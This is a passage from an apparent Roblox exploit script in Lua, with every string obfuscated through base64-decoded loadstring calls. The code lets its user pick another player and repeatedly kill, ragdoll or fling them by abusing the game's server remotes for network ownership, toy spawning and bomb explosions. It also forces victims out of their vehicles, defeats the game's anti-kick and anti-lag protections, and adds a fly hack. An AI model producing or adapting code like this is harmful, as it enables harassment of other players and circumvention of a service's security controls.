                    local tRoot = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                    local tHead = tChar and tChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                    
                    if not (target and tRoot and tHum and tHead) then return end
                    if isTooHigh(target) then return end
                    if tHum:GetState() == Enum.HumanoidStateType.Dead then return end

                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not (char and hrp) then return end

                    if not char:GetAttribute(loadstring(base64decode("U2F2aW5nT3JpZ2luYWxQb3M="))()) then
                        saveOriginalPos()
                    end
                    char:SetAttribute(loadstring(base64decode("U2F2aW5nT3JpZ2luYWxQb3M="))(), true)
                    getgenv().originalFallenHeight = workspace.FallenPartsDestroyHeight
                    workspace.FallenPartsDestroyHeight = 0/0

                    local originalPos = getOriginalPos()
                    if originalPos then cameraAnchor:attach(originalPos) end

                    hrp:PivotTo(CFrame.new(tRoot.Position + TELEPORT_OFFSET))
                    setNoCollideChar(tChar)
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                    task.wait(0.05)
                    ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(tRoot)
                    task.wait(0.05)

                    if tHead:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and tHead.PartOwner.Value == LocalPlayer.Name then
                        task.wait(0.05)
                        modifyTarget(tRoot, tHum)
                    end
                    scheduleReturnHome()
                end

                KillHB = RunService.Heartbeat:Connect(performKill)
                loopKillConnections = {KillHB}

            elseif selectedKillMode == loadstring(base64decode("TG9vcCBCYW5hbmEgUmFnZG9sbA=="))() then
                local bool = {LoopRagdoll = false}
                local etc = {}

                loopKillTask = task.spawn(function()
                    bool.LoopRagdoll = true
                    
                    local function FWD(parent, part, time)
                        return parent:FindFirstChild(part) or parent:WaitForChild(part, time or 5)
                    end

                    local function CFP(parent, part)
                        return parent:FindFirstChild(part) ~= nil  
                    end

                    local function sno(part) 
                        pcall(function() ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(part, part.CFrame) end)
                    end

                    local function unsno(part) 
                        pcall(function() ReplicatedStorage.GrabEvents.DestroyGrabLine:FireServer(part) end)
                    end

                    local function CheckNetworkOwnerOnPart(Part) 
                        return CFP(Part, loadstring(base64decode("UGFydE93bmVy"))()) and Part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()).Value == LocalPlayer.Name
                    end

                    local function SpawnToy(ToyName)
                        local InPlot = LocalPlayer:FindFirstChild(loadstring(base64decode("SW5QbG90"))())
                        local InOwnedPlot = LocalPlayer:FindFirstChild(loadstring(base64decode("SW5Pd25lZFBsb3Q="))())
                        local CanSpawnToy = LocalPlayer:FindFirstChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))())

                        if InPlot and InPlot.Value and InOwnedPlot and not InOwnedPlot.Value then 
                            InPlot:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Wait()
                        end 
                        if CanSpawnToy and not CanSpawnToy.Value then 
                            CanSpawnToy:GetPropertyChangedSignal(loadstring(base64decode("VmFsdWU="))()):Wait()
                        end

                        local currentHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not currentHRP then return nil end

                        local SpawnCF = currentHRP.CFrame * CFrame.new(0, 14, 20)
                        local Container = workspace:FindFirstChild(LocalPlayer.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        
                        if not Container then return nil end

                        local spawnedObject = nil
                        local connection
                        connection = Container.ChildAdded:Connect(function(child)
                            if child.Name == ToyName then
                                spawnedObject = child
                            end
                        end)

                        task.spawn(function()
                            pcall(function()
                                ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(ToyName, SpawnCF, Vector3.zero)
                            end)
                        end)

                        local start = tick()
                        repeat task.wait() until spawnedObject or (tick() - start) > 2.5

                        if connection then connection:Disconnect() end
                        return spawnedObject
                    end

                    local targetPlayerName = selectedKickPlayer and selectedKickPlayer.Name
                    etc.TargetPLR = targetPlayerName and Players:FindFirstChild(targetPlayerName)
                    
                    if not etc.TargetPLR then 
                        Library:Notify({ Title = loadstring(base64decode("U3lzdGVt"))(), Description = loadstring(base64decode("RXJyb3I6IFRhcmdldCBkb2VzIG5vdCBleGlzdCE="))(), Duration = 3 })
                        return 
                    end 
                    
                    etc.Root = etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
                    local AlignPos
                    local AtachNew
                    
                    while bool.LoopRagdoll and loopKillActive and task.wait() do 
                        etc.Root = etc.TargetPLR and etc.TargetPLR.Character and etc.TargetPLR.Character:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
                        if not etc.Root then continue end 
                        
                        local inv = workspace:FindFirstChild(LocalPlayer.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        if not inv then continue end

                        local banana = inv:FindFirstChild(loadstring(base64decode("Rm9vZEJhbmFuYQ=="))())
                        local SoundPart = banana and banana:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                        
                        if not SoundPart then 
                            for _, v in pairs(inv:GetChildren()) do 
                                if v.Name == loadstring(base64decode("Rm9vZEJhbmFuYQ=="))() then 
                                    pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(v) end)
                                end 
                            end 
                            
                            banana = SpawnToy(loadstring(base64decode("Rm9vZEJhbmFuYQ=="))())
                            if not banana then continue end
                            
                            SoundPart = FWD(banana, loadstring(base64decode("U291bmRQYXJ0"))(), 5)
                            if not SoundPart then continue end
                            
                            local holdPart = FWD(banana, loadstring(base64decode("SG9sZFBhcnQ="))(), 5)
                            if holdPart then
                                local holdRemote = FWD(holdPart, loadstring(base64decode("SG9sZEl0ZW1SZW1vdGVGdW5jdGlvbg=="))(), 5)
                                if holdRemote then
                                    pcall(function() holdRemote:InvokeServer(banana, LocalPlayer.Character) end)
                                end
                            end

                            while CFP(banana, loadstring(base64decode("RWRpYmxlUGFydA=="))()) and bool.LoopRagdoll do task.wait() end

                            if holdPart then
                                local dropRemote = FWD(holdPart, loadstring(base64decode("RHJvcEl0ZW1SZW1vdGVGdW5jdGlvbg=="))(), 5)
                                if dropRemote and LocalPlayer.Character then
                                    pcall(function() dropRemote:InvokeServer(banana, LocalPlayer.Character:GetPivot() * CFrame.new(0, 15, -10), Vector3.zero) end)
                                end
                            end
                            
                            repeat 
                                task.wait(0.01)
                                SoundPart = banana and banana:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                                if not SoundPart then break end 
                                sno(SoundPart)
                            until not SoundPart or CFP(SoundPart, loadstring(base64decode("UGFydE93bmVy"))()) or not bool.LoopRagdoll
                            
                            unsno(SoundPart)
                            local Atach = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))())
                            Atach.Parent = SoundPart
                            
                            AlignPos = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
                            AlignPos.Responsiveness = 100
                            AlignPos.Parent = SoundPart
                            AlignPos.Attachment0 = Atach
                        end
                        
                        for _, v in pairs(banana:GetChildren()) do 
                            if CFP(v, loadstring(base64decode("UGFydE93bmVy"))()) and not CheckNetworkOwnerOnPart(v) then 
                                pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana) end) 
                                banana = nil 
                                break 
                            end
                        end
                        
                        if not banana then continue end 
                        AlignPos = SoundPart:FindFirstChild(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
                        
                        if not AlignPos then 
                            pcall(function() ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana) end) 
                            banana = nil 
                            continue 
                        end
                        
                        AtachNew = etc.Root and etc.Root:FindFirstChild(loadstring(base64decode("TGVmdEZvb3RBdHRhY2htZW50"))())
                        if not AtachNew then continue end 
                        AlignPos.Attachment1 = AtachNew
                    end 
                    
                    pcall(function()
                        local inv = workspace:FindFirstChild(LocalPlayer.Name..loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        local banana = inv and inv:FindFirstChild(loadstring(base64decode("Rm9vZEJhbmFuYQ=="))())
                        if banana then 
                            local SoundPart = banana:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                            local AlignPos = SoundPart and SoundPart:FindFirstChild(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
                            if AlignPos then AlignPos:Destroy() end 
                            ReplicatedStorage.MenuToys.DestroyToy:FireServer(banana)
                        end
                    end)
                end)

            elseif selectedKillMode == loadstring(base64decode("TG9vcCBTbm93YmFsbA=="))() then
                loopKillTask = task.spawn(function()
                    local Remotes = {
                        SpawnToy = ReplicatedStorage:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))()),
                        SetNetOwner = ReplicatedStorage:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()),
                        BombExplode = ReplicatedStorage:WaitForChild(loadstring(base64decode("Qm9tYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("Qm9tYkV4cGxvZGU="))())
                    }

                    while loopKillActive do
                        local targetSource = selectedKickPlayer
                        local targetName = nil
                        
                        if typeof(targetSource) == loadstring(base64decode("SW5zdGFuY2U="))() and targetSource:IsA(loadstring(base64decode("UGxheWVy"))()) then
                            targetName = targetSource.Name
                        elseif typeof(targetSource) == loadstring(base64decode("c3RyaW5n"))() then
                            targetName = targetSource:match(loadstring(base64decode("QCguLSklKQ=="))()) or targetSource
                        end

                        local target = targetName and Players:FindFirstChild(targetName)
                        if not target or not target.Character then
                            task.wait(0.1)
                            continue 
                        end

                        local tRoot = target.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not tRoot then 
                            task.wait(0.1)
                            continue 
                        end

                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not hrp then 
                            task.wait(0.1)
                            continue 
                        end

                        local inv = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        if not inv then 
                            task.wait(0.1)
                            continue 
                        end

                        local ball = inv:FindFirstChild(loadstring(base64decode("QmFsbFNub3diYWxs"))())
                        if not ball then
                            task.spawn(function()
                                pcall(function() 
                                    Remotes.SpawnToy:InvokeServer(loadstring(base64decode("QmFsbFNub3diYWxs"))(), hrp.CFrame * CFrame.new(0, 10, 20), Vector3.zero) 
                                end)
                            end)
                            task.wait(0.15)
                        else
                            local SoundPart = ball:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                            if SoundPart then
                                pcall(function() Remotes.SetNetOwner:FireServer(SoundPart, SoundPart.CFrame) end)
                                task.wait(0.05)

                                SoundPart.CFrame = tRoot.CFrame
                                task.wait(0.05)

                                local payload = {
                                    Radius = 0,
                                    Color = Color3.new(0, 0, 0),
                                    TimeLength = 0,
                                    Model = ball,
                                    Type = loadstring(base64decode("U25vd1Bvb2Y="))(),
                                    ExplodesByFire = false,
                                    MaxForcePerStudSquared = 0,
                                    Hitbox = SoundPart,
                                    ImpactSpeed = 0,
                                    ExplodesByPointy = false,
                                    DestroysModel = true,
                                    PositionPart = SoundPart
                                }
                                
                                pcall(function() Remotes.BombExplode:FireServer(payload, Vector3.zero) end)
                                task.wait(0.15)
                            else
                                task.wait(0.1)
                            end
                        end
                    end
                end)
            end
        end
    })
end

game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))()).InputBegan:Connect(function(input, processed)
	if not processed and input.KeyCode == Enum.KeyCode.T and _G.AutoSitBlobT then
		local plr = game.Players.LocalPlayer
		local char = plr.Character
		local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
		local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
		if not hrp or not hum then
			return
		end
		local folderName = plr.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))()
		local folder = workspace:FindFirstChild(folderName)
		local blob = folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())
		if not blob then
			task.spawn(function()
				pcall(function()
					game.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))(), hrp.CFrame, Vector3.zero)
				end)
			end)
			if not folder then
				folder = workspace:WaitForChild(folderName, 5)
			end
			if folder then
				blob = folder:WaitForChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))(), 5)
			end
		end
		if blob then
			local seat = blob:WaitForChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))(), 5)
			if seat then
				local t = tick()
				repeat
					if not hum.SeatPart then
						hrp.CFrame = seat.CFrame + Vector3.new(0, 1, 0)
						hrp.Velocity = Vector3.zero
						seat:Sit(hum)
					end
					game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Wait()
				until hum.SeatPart == seat or tick() - t > 1.5
			end
		end
	end
end)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if not gameProcessed and input.KeyCode == Enum.KeyCode.R then
		if blobMasterSwitch then
			blobFlyActive = not blobFlyActive
			if not blobFlyActive then
				if bvInstance then
					bvInstance:Destroy()
					bvInstance = nil
				end
				if bgInstance then
					bgInstance:Destroy()
					bgInstance = nil
				end
			end
		end
	end
end)
local function GetBlobRoot()
	local char = Player.Character
	local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	if hum and hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
		return hum.SeatPart.Parent:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or hum.SeatPart.Parent.PrimaryPart
	end
	local folder = workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
	if folder then
		local blob = folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())
		if blob then
			return blob:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) or blob.PrimaryPart
		end
	end
	return nil
end
game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))()).Heartbeat:Connect(function()
	if not blobFlyActive or not blobMasterSwitch then
		if bvInstance then
			bvInstance:Destroy()
			bvInstance = nil
		end
		if bgInstance then
			bgInstance:Destroy()
			bgInstance = nil
		end
		return
	end
	local root = GetBlobRoot()
	if root then
		if not root:FindFirstChild(loadstring(base64decode("QmxvYkZseVZlbG9jaXR5"))()) then
			bvInstance = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
			bvInstance.Name = loadstring(base64decode("QmxvYkZseVZlbG9jaXR5"))()
			bvInstance.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bvInstance.P = 10000
			bvInstance.Parent = root
		else
			bvInstance = root.BlobFlyVelocity
		end
		if not root:FindFirstChild(loadstring(base64decode("QmxvYkZseUd5cm8="))()) then
			bgInstance = Instance.new(loadstring(base64decode("Qm9keUd5cm8="))())
			bgInstance.Name = loadstring(base64decode("QmxvYkZseUd5cm8="))()
			bgInstance.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bgInstance.P = 20000
			bgInstance.D = 100
			bgInstance.Parent = root
		else
			bgInstance = root.BlobFlyGyro
		end
		local cam = workspace.CurrentCamera
		local moveDir = Vector3.zero
		if UserInputService:IsKeyDown(Enum.KeyCode.W) then
			moveDir = moveDir + cam.CFrame.LookVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.S) then
			moveDir = moveDir - cam.CFrame.LookVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.A) then
			moveDir = moveDir - cam.CFrame.RightVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.D) then
			moveDir = moveDir + cam.CFrame.RightVector
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
			moveDir = moveDir + Vector3.new(0, 1, 0)
		end
		if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
			moveDir = moveDir - Vector3.new(0, 1, 0)
		end
		if bvInstance then
			bvInstance.Velocity = moveDir * blobFlySpeed
		end
		if bgInstance then
			bgInstance.CFrame = cam.CFrame
		end
	else
		if bvInstance then
			bvInstance:Destroy()
			bvInstance = nil
		end
		if bgInstance then
			bgInstance:Destroy()
			bgInstance = nil
		end
	end
end)
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())

local LocalPlayer = Players.LocalPlayer

local destroyGucciActive = false
local ATTEMPT_TIME = 0.9
local COOLDOWN = 0.45

local function getHumanoid(player)
    local character = player and player.Character
    return character and character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
end

local function getTargetPlayer()
    if selectedKickPlayer and selectedKickPlayer.Parent then
        return selectedKickPlayer
    end
    if selectedPlrName then
        return Players:FindFirstChild(selectedPlrName)
    end
    return nil
end

TargetGroup:CreateToggle({
    Name = loadstring(base64decode("RGVzdHJveSBHdWNjaSAoc2l0KQ=="))(),
    Flag = loadstring(base64decode("RGVzdHJveUd1Y2NpU2l0"))(),
    Default = false,
    Callback = function(Value)
        destroyGucciActive = Value
        
        if Value then
            local target = getTargetPlayer()
            if not target then
                Library:Notify({
                    Title = loadstring(base64decode("RXJyb3I="))(),
                    Content = loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdCE="))(),
                    Duration = 3
                })
                destroyGucciActive = false
                return
            end
            
            task.spawn(function()
                while destroyGucciActive do
                    local target = getTargetPlayer()
                    if not target or not target.Parent then
                        Library:Notify({
                            Title = loadstring(base64decode("U3lzdGVt"))(),
                            Content = loadstring(base64decode("VGFyZ2V0IGxlZnQgdGhlIGdhbWUh"))(),
                            Duration = 3
                        })
                        destroyGucciActive = false
                        break
                    end
                    
                    local myCharacter = LocalPlayer.Character
                    local myHumanoid = myCharacter and myCharacter:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                    local myRoot = myCharacter and myCharacter:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    local targetHumanoid = getHumanoid(target)
                    
                    if not myHumanoid or not myRoot or not targetHumanoid then
                        task.wait(0.5)
                        continue
                    end
                    
                    local targetSeat = targetHumanoid.SeatPart
                    
                    if targetSeat and targetSeat:IsA(loadstring(base64decode("U2VhdA=="))()) then
                        local returnCFrame = myRoot.CFrame
                        
                        if myHumanoid.SeatPart ~= targetSeat then
                            local magnetConnection = RunService.Stepped:Connect(function()
                                if not destroyGucciActive or not targetSeat.Parent or not myRoot.Parent then
                                    return
                                end
                                myRoot.CFrame = targetSeat.CFrame
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                if targetSeat.Parent and targetSeat.Parent.PrimaryPart then
                                    targetSeat.Parent.PrimaryPart.AssemblyLinearVelocity = Vector3.zero
                                    targetSeat.Parent.PrimaryPart.AssemblyAngularVelocity = Vector3.zero
                                end
                            end)
                            
                            local deadline = os.clock() + ATTEMPT_TIME
                            
                            while destroyGucciActive and os.clock() < deadline and targetSeat.Parent and myHumanoid.SeatPart ~= targetSeat do
                                pcall(function()
                                    targetSeat:Sit(myHumanoid)
                                end)
                                task.wait()
                            end
                            
                            magnetConnection:Disconnect()
                            
                            if myHumanoid.SeatPart == targetSeat then
                                task.wait(0.15)
                                myHumanoid.Sit = false
                                myHumanoid.Jump = true
                                task.wait(0.05)
                                
                                if myRoot.Parent then
                                    myRoot.CFrame = returnCFrame
                                    myRoot.AssemblyLinearVelocity = Vector3.zero
                                end
                                
                                Library:Notify({
                                    Title = loadstring(base64decode("U3VjY2Vzcw=="))(),
                                    Content = target.DisplayName .. loadstring(base64decode("J3MgdmVoaWNsZSBoYXMgYmVlbiByZW1vdmVkIQ=="))(),
                                    Duration = 3
                                })
                                task.wait(0.5)
                            else
                                if myRoot.Parent then
                                    myRoot.CFrame = returnCFrame
                                end
                            end
                        end
                    end
                    
                    task.wait(COOLDOWN)
                end
            end)
        end
    end
})

	--// Allowed items
local AllowedItems = {
    -- Food
	FoodHamburger = true,
	FoodCoconut = true,
	FoodPizzaCheese = true,
	FoodPizzaPepperoni = true,
	FoodHotdog = true,
	FoodMushroomPoison = true,
	FoodBread = true,
	FoodDippyEgg = true,
	FoodMayonnaise = true,
	FoodFrenchFries = true,
	FoodMeatStick = true,
	FoodDonut = true,
	FoodCakePink = true,

    -- Instruments
	InstrumentGuitarBanjo = true,
	InstrumentGuitarViolin = true,
	InstrumentGuitarUkulele = true,
	InstrumentWoodwindSaxophone = true,
	InstrumentWoodwindOcarina = true,
	InstrumentBrassVuvuzelaQwizik = true,
	InstrumentBrassTrumpet = true,
	InstrumentDrumBongos = true,
	InstrumentDrumSnare = true,
	InstrumentPianoMelodica = true,
	InstrumentVoiceMicrophone = true,

    -- Cups
	CupMugWhite = true,
	CupMugBrown = true,

    -- Poop
	PoopPile = true,
	PoopPileSparkle = true,
}

local antiAntiLagEnabled = false

TargetGroup:CreateToggle({
	Name = loadstring(base64decode("UmVtb3ZlIEFudGkgSW5wdXQgTGFn"))(),
        Flag = loadstring(base64decode("UmVtb3ZlIEFudGkgSW5wdXQgTGFn"))(),
	Default = false,
	Callback = function(on)
        SetToggleState(loadstring(base64decode("UmVtb3ZlIEFudGkgSW5wdXQgTGFn"))(), on)
		antiAntiLagEnabled = on
		if not on then
			antiAntiLagEnabled = false
			return
		end
		task.spawn(function()
			local plr = game.Players.LocalPlayer
			local char = plr.Character
			local hrp = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
			if not hrp then
				return
			end
			local burgers = {}
			for _, v in ipairs(workspace:GetDescendants()) do
				if AllowedItems[v.Name] and v:IsA(loadstring(base64decode("TW9kZWw="))()) and v:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))()) then
					burgers[#burgers + 1] = v
				end
			end
			workspace.DescendantAdded:Connect(function(obj)
				if AllowedItems[obj.Name] and obj:IsA(loadstring(base64decode("TW9kZWw="))()) then
					task.spawn(function()
						local hp = obj:WaitForChild(loadstring(base64decode("SG9sZFBhcnQ="))(), 3)
						if hp then
							burgers[#burgers + 1] = obj
						end
					end)
				end
			end)
			while antiAntiLagEnabled do
				for xVec0uwV = #burgers, 1, -1 do
					local b = burgers[xVec0uwV]
					if not b or not b.Parent or not b:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))()) then
						table.remove(burgers, xVec0uwV)
					else
						local hp = b.HoldPart
						pcall(function()
							hp.HoldItemRemoteFunction:InvokeServer(b, char)
						end)
						task.wait()
						pcall(function()
							hp.DropItemRemoteFunction:InvokeServer(
                                b,
                                CFrame.new(hrp.Position + Vector3.new(0, -2000, 0)),
                                Vector3.new(0, 0, 0)
                            )
						end)
					end
				end
				task.wait()
			end
		end)
	end
})
do

    local modeOptions = {
        loadstring(base64decode("QW50aS1BbnRpS2ljayBDTElDSw=="))(),
        loadstring(base64decode("QW50aS1BbnRpS2ljayBCWVBBU1M="))()
    }

    local selectedAntiMode = loadstring(base64decode("QW50aS1BbnRpS2ljayBDTElDSw=="))()
    local antiActive = false
    local antiTask = nil

    local function cleanupAnti()
        if antiTask then
            task.cancel(antiTask)
            antiTask = nil
        end
        antiActive = false
    end

    TargetGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IEFudGktQW50aUtpY2sgTW9kZQ=="))(),
        Items = modeOptions,
        Default = loadstring(base64decode("QW50aS1BbnRpS2ljayBDTElDSw=="))(),
        Callback = function(Value)
            selectedAntiMode = Value
        end
    })

    TargetGroup:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIEFudGktQW50aUtpY2s="))(),
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupAnti()
                return
            end

            if antiActive then
                cleanupAnti()
            end

            antiActive = Value

            local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
            local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
            local LocalPlayer = Players.LocalPlayer

            local GrabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
            local SetNetOwner = GrabEvents and GrabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
            local PlayerEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("UGxheWVyRXZlbnRz"))())
            local StickyEvent = PlayerEvents and PlayerEvents:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydEV2ZW50"))())

            local function sno(part)
                if SetNetOwner and part then
                    pcall(function() SetNetOwner:FireServer(part, part.CFrame) end)
                end
            end

            local function CheckNetworkOwnerOnPart(part)
                local owner = part:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
                return owner and owner.Value == LocalPlayer.Name
            end

            local function GetMagnitude(part1, part2)
                if not (part1 and part2) then return math.huge end
                return (part1.Position - part2.Position).Magnitude
            end

            if selectedAntiMode == loadstring(base64decode("QW50aS1BbnRpS2ljayBDTElDSw=="))() then
                antiTask = task.spawn(function()
                    while antiActive do
                        task.wait()
                        local TargetPLR = typeof(selectedKickPlayer) == loadstring(base64decode("SW5zdGFuY2U="))() and selectedKickPlayer or (selectedKickPlayer and Players:FindFirstChild(tostring(selectedKickPlayer)))
                        if not TargetPLR then continue end 
                        
                        local TargetInv = workspace:FindFirstChild(TargetPLR.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        if not TargetInv then continue end

                        local Root = TargetPLR.Character and TargetPLR.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local FirePlayerPart = Root and Root:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))())
                        
                        if not FirePlayerPart then continue end

                        for _, v in pairs(TargetInv:GetChildren()) do 
                            local StickyPart = v:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))())
                            if StickyPart then 
                                if StickyPart.CanQuery then 
                                    task.spawn(function()
                                        for _, part in pairs(v:GetChildren()) do  
                                            if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then  
                                                part.CanCollide = false 
                                                part.CanTouch = false 
                                                part.CanQuery = false
                                            end
                                        end
                                    end)
                                end
                                
                                if not CheckNetworkOwnerOnPart(StickyPart) then 
                                    sno(StickyPart)
                                end
                            end
                        end
                    end
                end)

            elseif selectedAntiMode == loadstring(base64decode("QW50aS1BbnRpS2ljayBCWVBBU1M="))() then
                antiTask = task.spawn(function()
                    while antiActive do
                        task.wait()
                        local TargetPLR = typeof(selectedKickPlayer) == loadstring(base64decode("SW5zdGFuY2U="))() and selectedKickPlayer or (selectedKickPlayer and Players:FindFirstChild(tostring(selectedKickPlayer)))
                        if not TargetPLR then continue end
                        
                        local TargetInv = workspace:FindFirstChild(TargetPLR.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        if not TargetInv then continue end

                        local Root = TargetPLR.Character and TargetPLR.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local FirePlayerPart = Root and Root:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))())
                        
                        if not FirePlayerPart then continue end

                        local myChar = LocalPlayer.Character
                        local myHRP = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local myFirePart = myHRP and myHRP:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))())

                        for _, v in pairs(TargetInv:GetChildren()) do 
                            local StickyPart = v:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydA=="))())
                            if StickyPart then 
                                local StickyWeld = StickyPart:FindFirstChild(loadstring(base64decode("U3RpY2t5V2VsZA=="))())
                                if not StickyWeld then continue end 
                                
                                if StickyPart.CanQuery then 
                                    task.spawn(function()
                                        for _, part in pairs(v:GetChildren()) do  
                                            if part:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then  
                                                part.CanCollide = false 
                                                part.CanTouch = false 
                                                part.CanQuery = false
                                            end
                                        end
                                    end)
                                end
                                
                                if myFirePart and StickyWeld.Part1 == myFirePart and GetMagnitude(FirePlayerPart, StickyPart) > 7 then 
                                    continue 
                                elseif not CheckNetworkOwnerOnPart(StickyPart) then 
                                    sno(StickyPart)
                                else
                                    if StickyEvent then
                                        pcall(function()
                                            StickyEvent:FireServer(
                                                StickyPart,
                                                FirePlayerPart,
                                                CFrame.new(0, -10, 5)
                                            )
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    })
end


TargetGroup:CreateToggle({
	Name = loadstring(base64decode("UmVtb3ZlIEFudGkgS2ljaw=="))(),
        Flag = loadstring(base64decode("UmVtb3ZlIEFudGkgS2ljaw=="))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("UmVtb3ZlIEFudGkgS2ljaw=="))(), Value)
		antiAntiKickActive = Value
		if Value then
			task.spawn(function()
